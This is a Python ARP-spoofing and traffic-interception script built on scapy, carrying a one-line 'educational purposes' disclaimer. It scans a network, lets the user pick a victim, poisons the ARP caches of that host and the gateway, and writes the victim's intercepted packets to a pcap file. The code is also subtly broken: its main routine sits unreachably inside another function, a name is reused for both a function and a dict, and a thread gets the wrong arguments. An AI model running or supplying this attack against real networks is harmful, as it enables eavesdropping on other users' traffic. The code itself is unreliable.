#!/usr/bin/env python3
# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.

import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

cwd = os.getcwd()


def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()


def arp_scan(ip_range):
    arp_responses = list()
    answered_lst = scapy.arping(ip_range, verbose=0)[0]

    for res in answered_lst:
        arp_responses.append({"ip": res[1].psrc, "mac": res[1].hwsrc})
    return arp_responses


def is_gateway(gateway_ip):
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    for row in result:
        if gateway_ip in row:
            return True

    return False


def get_interface_names():
    os.chdir("/sys/class/net")
    interface_names = os.listdir()
    return interface_names


def match_iface_name(row):
    interface_names = get_interface_names()

    for iface in interface_names:
        if iface in row:
            return iface


def gateway_info(network_info):
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    gateways = []
    for iface in network_info:
        for row in result:
            if iface["ip"] in row:
                iface_name = match_iface_name(row)
                gateways.append({"iface": iface_name, "ip": iface["ip"], "mac": iface["mac"]})

    return gateways


def clients(arp_res, gateway_res):
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            if gateway["ip"] != item["ip"]:
                client_list.append(item)
    return client_list


def allow_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])


def arp_spoofer(target_ip, target_mac, spoof_ip):
    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)


def send_spoof_packets(node_to_spoof=None):
    while True:
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
        time.sleep(3)


def packet_sniffer(interface):
    packets = scapy.sniff(iface=interface, store=False, prn=process_sniffed_pkt)


def process_sniffed_pkt(pkt):
    print("Writing to pcap file. Press ctrl + c to exit.")
    scapy.wrpcap("requests.pcap", pkt, append=True)


def print_arp_res(arp_res):
    print("ID\t\tIP\t\t\tMAC Address")
    for id, res in enumerate(arp_res):
        print("{}\t\t{}\t\t{}".format(id, res['ip'], res['mac']))
    while True:
        try:
            choice = int(
                input("Please select the ID of the computer whose ARP cache you want to poison (ctrl+z to exit): "))
            if arp_res[choice]:
                return choice
        except:
            print("Please enter a valid choice!")

    def get_cmd_arguments():
        ip_range = None
        if len(sys.argv) - 1 > 0 and sys.argv[1] != "-ip_range":
            print("-ip_range flag not specified.")
            return ip_range
        elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
            try:
                print(f"{IPv4Network(sys.argv[2])}")
                ip_range = sys.argv[2]
                print("Valid ip range entered through command-line.")
            except:
                print("Invalid command-line argument supplied.")

        return ip_range

    in_sudo_mode()

    ip_range = get_cmd_arguments()

    if ip_range == None:
        print("No valid ip range specified. Exiting!")
        exit()

    allow_ip_forwarding()

    arp_res = arp_scan(ip_range)

    if len(arp_res) == 0:
        print("No connection. Exiting, make sure devices are active or turned on.")
        exit()

    gateways = gateway_info(arp_res)

    gateway_info = gateways[0]

    client_info = clients(arp_res, gateways)

    if len(client_info) == 0:
        print("No clients found when sending the ARP messages. Exiting, make sure devices are active or turned on.")
        exit()

    choice = print_arp_res(client_info)

    node_to_spoof = client_info[choice]
    t1 = threading.Thread(target=send_spoof_packets, daemon=True)
    t1.start()
    os.chdir(cwd)
    packet_sniffer(gateway_info["iface"])
